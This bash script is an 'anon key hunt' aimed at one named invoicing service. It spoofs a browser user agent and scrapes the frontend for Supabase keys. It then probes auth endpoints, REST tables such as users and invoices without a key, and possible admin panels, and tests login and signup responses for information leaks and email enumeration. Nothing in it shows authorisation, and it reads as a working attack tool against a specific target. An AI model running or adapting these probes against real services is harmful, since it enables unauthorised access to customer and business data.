#!/usr/bin/env bash
# Hunt for Supabase anon key in Facturaz frontend + test auth endpoints

UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

echo "=============================="
echo " ANON KEY HUNT — FACTURAZ"
echo "=============================="

# 1. Fetch app.facturaz.es with browser UA
echo ""
echo "[+] Fetching app.facturaz.es with browser UA..."
HTML=$(curl -skL -H "User-Agent: $UA" -H "Accept: text/html,application/xhtml+xml" "https://app.facturaz.es/" 2>/dev/null)
echo "  HTML length: ${#HTML}"
echo "$HTML" | grep -oE 'src="[^"]*\.(js|ts)[^"]*"' | head -20
echo "$HTML" | grep -oE "/_next/static/[^'\"]*\.js" | head -10
echo "$HTML" | grep -oE "/assets/[^'\"]*\.js" | head -10
echo "$HTML" | grep -iE "supabase|apikey|anon" | head -10

# 2. Try common Supabase static asset paths (Next.js / Vite patterns)
echo ""
echo "[+] Probing for JS chunk files..."
for path in \
  "/_next/static/chunks/main.js" \
  "/_next/static/chunks/pages/_app.js" \
  "/assets/index.js" \
  "/static/js/main.js" \
  "/static/js/bundle.js" \
  "/js/app.js" \
  "/app.js"; do
  code=$(curl -skL -o /dev/null -w "%{http_code}" -H "User-Agent: $UA" "https://app.facturaz.es${path}" 2>/dev/null)
  if [[ "$code" != "404" && "$code" != "000" ]]; then
    echo "  [$code] $path"
  fi
done

# 3. Supabase auth endpoints that may leak info without key
echo ""
echo "[+] Supabase auth endpoints (no key)..."
for ep in \
  "/auth/v1/settings" \
  "/auth/v1/health" \
  "/auth/v1/callback" \
  "/auth/v1/signup" \
  "/auth/v1/token"; do
  result=$(curl -sk -o - -w "CODE:%{http_code}" -H "User-Agent: $UA" "https://api.facturaz.es${ep}" 2>/dev/null)
  code=$(echo "$result" | grep -o 'CODE:[0-9]*' | cut -d: -f2)
  body=$(echo "$result" | sed 's/CODE:[0-9]*$//' | head -c 200 | tr -d '\n')
  echo "  [$code] $ep => $body"
done

# 4. Try REST v1 table enumeration with no key (some Supabase configs expose this)
echo ""
echo "[+] Supabase REST table probes (no key)..."
for table in users invoices contacts companies expenses proposals projects documents; do
  result=$(curl -sk -o - -w "CODE:%{http_code}" "https://api.facturaz.es/rest/v1/${table}" 2>/dev/null)
  code=$(echo "$result" | grep -o 'CODE:[0-9]*' | cut -d: -f2)
  body=$(echo "$result" | sed 's/CODE:[0-9]*$//' | head -c 150 | tr -d '\n')
  echo "  [$code] /rest/v1/$table => $body"
done

# 5. Check if there's a Supabase studio or admin panel exposed
echo ""
echo "[+] Checking for Supabase studio / admin exposure..."
for path in "/studio" "/studio/" "/project/default" "/project" "/api/swagger"; do
  result=$(curl -sk -o - -w "CODE:%{http_code}" "https://api.facturaz.es${path}" 2>/dev/null)
  code=$(echo "$result" | grep -o 'CODE:[0-9]*' | cut -d: -f2)
  body=$(echo "$result" | sed 's/CODE:[0-9]*$//' | head -c 100 | tr -d '\n')
  echo "  [$code] $path => $body"
done

# 6. Check /auth/v1/token POST for info leak (no creds)
echo ""
echo "[+] POST to /auth/v1/token (checking error verbosity)..."
curl -sk -X POST "https://api.facturaz.es/auth/v1/token?grant_type=password" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"test"}' 2>/dev/null | head -c 300
echo ""

# 7. Try signup endpoint for user enumeration
echo ""
echo "[+] POST to /auth/v1/signup (email enumeration test)..."
curl -sk -X POST "https://api.facturaz.es/auth/v1/signup" \
  -H "Content-Type: application/json" \
  -d '{"email":"nonexistent@randomdomain12345.com","password":"Test123!@#"}' 2>/dev/null | head -c 300
echo ""
